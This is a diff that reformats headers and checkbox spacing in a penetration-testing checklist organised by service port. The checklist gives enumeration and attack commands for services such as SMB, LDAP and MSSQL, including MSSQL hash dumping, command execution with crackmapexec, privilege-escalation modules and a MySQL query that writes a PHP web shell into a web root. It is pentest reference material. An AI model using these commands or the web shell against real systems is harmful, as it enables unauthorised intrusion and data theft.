@@ -55,25 +55,25 @@ NetBIOS Enumeration
 
 
 Vulnerability Assessment and PT
- FTP [Port 21]
+ FTP (Port 21)
 - [ ] Grabbing Banner for Versions
 - [ ] Anonymous Login
 - [ ] FTP Bounce
 - [ ] Default or Guessable Passwords
 
 
-SSH [Port 22]
+SSH (Port 22)
 - [ ] Grabbing Banner for Versions
 - [ ] Null Password
 - [ ] Default or Guessable Passwords
 
-SMTP [Port 25]
+SMTP (Port 25)
 - [ ] Grabbing Banner for Versions
 - [ ] Connect with Telnet
 - [ ] SMTP Relay
 - [ ] User Enumeration
 
-DNS [Port 53]
+DNS (Port 53)
 - [ ] DNS Hostname Bruteforce
 - [ ] DNS Reverse Lookup
 - [ ] DNS Service Record Enumeration
@@ -108,25 +108,25 @@ IIS
 - [ ] Directory BruteForce
 
 
- Kerberos [Port 88]
+ Kerberos (Port 88)
 - [ ] Active Directory Attacks (We're not going to cover this here)
 - [ ] Bruteforcing Usernames with nmap
 - [ ] krb5-enum-users.nse
 
-RPC [Port 111]
+RPC (Port 111)
 - [ ] Enumerating Basic Information using rpcinfo
 - [ ] Connect to RPC with RPC Client
 
-Rusersd [Port 1026]
+Rusersd (Port 1026)
 - [ ] Enumerating users with rusers
 
-NFS [2049]
+NFS (2049)
 - [ ] Checking for Accessible mounts
 - [ ] showmount -e <IP>
 - [ ] Mounting
 - [ ] mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
 
-LDAP [Port 389]
+LDAP (Port 389)
 - [ ] Listing public information
 - [ ] nmap -n -sV --script "ldap* and not brute" <IP>
 - [ ] Checking Null Credentials
@@ -159,7 +159,7 @@ Extracting Remote Desktop Groups
  - [ ] For graphical Interface, jxplorer can be used
     
     
-SMB [Port 445]
+SMB (Port 445)
 - [ ] Anonymous Credentials
 - [ ] Grabbing Banner for Versions
 - [ ] Null Sessions
@@ -192,34 +192,34 @@ SMB [Port 445]
 - [ ] mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
 - [ ] SMB Relay attack
     
-MSSRPC [Port 135]
+MSSRPC (Port 135)
 - [ ] Endpoint Mapper Service Discovery
 - [ ] Hidden DCERPC Server Discovery
 - [ ] Remote Management Interface Discovery
 - [ ] DCERPC TCP Service Auditor
 
-RTSP [Port 554 & 8554]
+RTSP (Port 554 & 8554)
 - [ ] Gathering RTSP Methods
 - [ ] RTSP Url Bruteforce
 - [ ] Camerader can be used to access RTSP
     
     
-  MSSQL Port 1433
+  MSSQL (Port 1433)
 - [ ] Banner Grabbing
 - [ ] Basic Information Gathering
    - [ ] nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-
          ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args
          mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-
-         name=MSSQLSERVER -sV -p 1433 IP
+         name=MSSQLSERVER -sV -p 1433 <IP>
 
-- [ ]Execute Commands with MSSQL
+Execute Commands with MSSQL
     - [ ] Authenticated
-    - [ ] crackmapexec mssql -d Domain name> -u <username> -p <password> -x "id"
+    - [ ] crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "id"
 
-- [ ]UnAuthenticated
+UnAuthenticated
   - [ ] If xp_cmdshell is enabled, we can execute commands without authentication
 
-- [ ]MSSQL Privilege Escalation
+MSSQL Privilege Escalation
    - [ ] auxiliary/admin/mssql/mssql_escalate_dbowner
    - [ ] auxiliary/admin/mssql/mssql_escalate_execute_as
     
@@ -231,9 +231,9 @@ MySQL [Port 3306]
     
     
 - [ ]Banner Grabbing
-- [ ]Basic Commands
+- [ ] Basic Commands
   - [ ]Enumerating Privileges
-     - [ ]select grantee, table_schema, privilege_type FROM schema_privileges;
+    - [ ] select grantee, table_schema, privilege_type FROM schema_privileges;
 
 - [ ] Enumerating File Privileges
      - [ ]select user,file_priv from mysql.user where user='root';
@@ -241,11 +241,11 @@ MySQL [Port 3306]
 - [ ] Enumerating Current User
    - [ ]select user();
     
-- [ ]Writing File
-  - [ ]select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/shell.php';
+- [ ] Writing File
+- [ ] select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/shell.php';
 
-- [ ]Reading file
-  - [ ]select load_file('/home/purabparihar/read_file.txt');
+- [ ] Reading file
+- [ ] select load_file('/home/purabparihar/read_file.txt');
     
 - [ ]User password change
   - [ ] UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
